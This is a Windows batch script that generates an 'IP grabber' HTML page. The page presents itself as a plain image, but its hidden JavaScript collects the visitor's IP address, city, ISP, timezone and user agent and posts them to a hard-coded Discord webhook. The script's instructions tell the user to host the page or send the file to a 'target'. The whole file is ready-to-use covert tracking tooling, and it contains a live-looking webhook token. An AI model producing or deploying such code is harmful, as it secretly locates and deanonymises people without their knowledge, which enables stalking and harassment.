@echo off
color 0A
title IP Grabber - Image Link Generator

cls
echo.
echo  ================================================================================
echo                            IP GRABBER - IMAGE LINK
echo  ================================================================================
echo.
echo  This will create an image link that logs IP addresses when opened
echo.
echo  ================================================================================
echo.

:: Your Discord webhook
set WEBHOOK=https://discord.com/api/webhooks/1464441055293210722/OQtfaLrpEDoIB2RcNP44v3mKMDOAl5y7-gu9aQrD2I7ll_eVXWEnlH0ujyi4lIHLKbfF

:: Create the HTML file with image that logs IP
set OUTPUT_FILE=ip_logger_%RANDOM%.html

echo Creating IP logger page...
echo.

(
echo ^<!DOCTYPE html^>
echo ^<html^>
echo ^<head^>
echo     ^<meta charset="UTF-8"^>
echo     ^<title^>Image^</title^>
echo     ^<style^>
echo         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #000; }
echo         img { max-width: 90%%; max-height: 90vh; border-radius: 10px; box-shadow: 0 10px 50px rgba(255,255,255,0.3); }
echo     ^</style^>
echo ^</head^>
echo ^<body^>
echo     ^<img src="https://i.imgur.com/YQ5xGXJ.jpeg" alt="Image"^>
echo     ^<script^>
echo         const WEBHOOK = '%WEBHOOK%';
echo         async function logIP() {
echo             try {
echo                 const response = await fetch('https://ipapi.co/json/'^);
echo                 const data = await response.json(^);
echo                 const userAgent = navigator.userAgent;
echo                 const timestamp = new Date(^).toLocaleString(^);
echo                 const payload = {
echo                     embeds: [{
echo                         title: '📸 Image Opened - IP Logged',
echo                         color: 3066993,
echo                         fields: [
echo                             { name: '🌐 IP Address', value: data.ip ^|^| 'Unknown', inline: true },
echo                             { name: '📍 Location', value: `${data.city}, ${data.region}, ${data.country_name}`, inline: true },
echo                             { name: '🏢 ISP', value: data.org ^|^| 'Unknown', inline: false },
echo                             { name: '🕐 Timezone', value: data.timezone ^|^| 'Unknown', inline: true },
echo                             { name: '⏰ Time', value: timestamp, inline: true },
echo                             { name: '🖥️ User Agent', value: userAgent.substring(0, 100^), inline: false }
echo                         ],
echo                         footer: { text: 'IP Logger' }
echo                     }]
echo                 };
echo                 await fetch(WEBHOOK, {
echo                     method: 'POST',
echo                     headers: { 'Content-Type': 'application/json' },
echo                     body: JSON.stringify(payload^)
echo                 }^);
echo             } catch(e^) {}
echo         }
echo         logIP(^);
echo     ^</script^>
echo ^</body^>
echo ^</html^>
) > %OUTPUT_FILE%

color 0C
echo  [SUCCESS] IP Logger created!
echo.
color 0E
echo  ================================================================================
echo.
echo  FILE CREATED: %OUTPUT_FILE%
echo.
echo  HOW TO USE:
echo  1. Upload this HTML file to a free hosting site like:
echo     - https://pages.github.com (GitHub Pages^)
echo     - https://netlify.com (Netlify^)
echo     - https://vercel.com (Vercel^)
echo.
echo  2. Share the hosted link with your target
echo.
echo  3. When they open the link, their IP will be sent to your Discord!
echo.
echo  ================================================================================
echo.
color 0A
echo  Alternative: Use the file directly!
echo  - Just open %OUTPUT_FILE% in your browser to test
echo  - Or send the file to someone (when they open it, IP is logged^)
echo.
echo  ================================================================================
echo.

pause
